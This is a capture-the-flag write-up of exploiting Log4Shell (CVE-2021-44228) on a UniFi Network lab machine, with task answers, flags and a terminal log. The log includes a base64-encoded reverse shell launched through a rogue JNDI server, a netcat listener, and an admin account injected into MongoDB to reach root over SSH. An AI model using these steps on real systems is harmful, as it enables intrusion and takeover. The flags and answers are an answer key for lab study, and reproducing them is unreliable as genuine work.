
Which are the first four open ports?
22,6789,8080,8443



What is the title of the software that is running running on port 8443?
UniFi Network

What is the version of the software that is running?
6.4.54

What is the CVE for the identified vulnerability?
CVE-2021-44228

What protocol does JNDI leverage in the injection?
ldap

What tool do we use to intercept the traffic, indicating the attack was successful?
tcpdump

What port do we need to inspect intercepted traffic for?
389

What port is the MongoDB service running on?
27117

What is the default database name for UniFi applications?
ace

What is the function we use to enumerate users within the database in MongoDB?
db.admin.find()

What is the function we use to update users within the database in MongoDB?
db.admin.update()

What is the password for the root user?
NotACrackablePassword4U2022

6ced1a6a89e666c0620cdb10262ba127


Submit root flag
e50bc93c75b634e4b272d2f771c33681






``` bash 
┌─[ramdark@parrot]─[/etc/rogue-jndi]
└──╼ $sudo git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

┌─[✗]─[ramdark@parrot]─[/etc/rogue-jndi]
└──╼ $java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuOC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.15.8"


┌─[ramdark@parrot]─[~]
└──╼ $sudo nc -nlvp 4444
[sudo] password for ramdark: 
listening on [any] 4444 ...
connect to [10.10.15.8] from (UNKNOWN) [10.129.150.227] 33856
whoami
unifi
python3 -c 'import pty;pty.spawn("/bin/bash");'
bash: line 2: python3: command not found
script /dev/null -c bash                                
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ ls
> db.admin.find().forEach(printjson);

┌─[ramdark@parrot]─[/etc/rogue-jndi]
└──╼ $mkpasswd -m sha-512 password
$6$o4w8RIzoLA0ovNZu$Q5uShwUH2Yu5DmUqreZiIjDYGXKzr7ZjEENwZl5AwiGgGtGabA7LQTMOAqhfEm8Vw6Iai4aII9fEzzRKGIvbP.
┌─[ramdark@parrot]─[/etc/rogue-jndi]
└──╼ $



db.admin.insert({"email":"crypto@localhost.local","last_site_name":"default","name":"crypto","time_created":NumberLong(100019800), "x_shadow":"$6$o4w8RIzoLA0ovNZu$Q5uShwUH2Yu5DmUqreZiIjDYGXKzr7ZjEENwZl5AwiGgGtGabA7LQTMOAqhfEm8Vw6Iai4aII9fEzzRKGIvbP."})
WriteResult({ "nInserted" : 1 })
> db.admin.find().forEach(printjson);


┌─[ramdark@parrot]─[~]
└──╼ $ssh root@10.129.150.227
The authenticity of host '10.129.150.227 (10.129.150.227)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.150.227' (ECDSA) to the list of known hosts.
root@10.129.150.227's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

root@unified:~# ls
root.txt
root@unified:~# cat root.txt 
e50bc93c75b634e4b272d2f771c33681
root@unified:~# cd home 
-bash: cd: home: No such file or directory
root@unified:~# cd /home
root@unified:/home# ls
michael
root@unified:/home# cd michael/
root@unified:/home/michael# ls
user.txt
root@unified:/home/michael# cat user.txt 
6ced1a6a89e666c0620cdb10262ba127
root@unified:/home/michael# 


```



+ [unifed ](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
+ 